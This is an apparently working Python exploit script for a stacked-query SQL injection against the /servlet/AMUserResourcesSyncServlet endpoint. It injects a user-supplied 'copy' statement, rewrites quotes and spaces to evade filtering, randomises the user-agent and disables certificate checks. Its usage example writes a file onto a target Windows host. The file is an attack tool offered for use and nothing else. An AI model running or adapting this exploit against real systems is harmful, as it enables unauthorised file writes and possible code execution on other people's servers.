#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def random_agent():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Main
def main(argv):
    if len(sys.argv) == 3:
        query = sys.argv[1]
        url = sys.argv[2]
    else:
        print("[*] Usage: " + sys.argv[0] + " <query> <url>\n")
        print("[*] Example: " + sys.argv[0] + " \"(select '1234') to 'c:\\\\users\\\\public\\\\testfile.txt'\" https://192.168.252.12:8443\n")
        exit(0)
    
    # User Agent
    headers = random_agent()

    # Variables
    urlpage = "/servlet/AMUserResourcesSyncServlet"
    params = "ForMasRange=1&userId=1"
    
    # Other query variables
    sqli = ";"
    prefix = "copy "
    suffix = ";-- "

    # Modify injection string via regex for character evasion
    inj_str = sqli + prefix + query + suffix
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$

    # Print original and modified query string
    print("\n[*] Original injection string:\n" + inj_str)
    print("\n[*] Regex modified injection string:\n" + inj_regex_str)
    print("\n")

    # Do stuff
    try:
        print("[*] HTTP response:")
        r = requests.get(url + urlpage,params=params + inj_regex_str,headers=headers,verify=False)
        print(r.text)
        print(r.headers)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
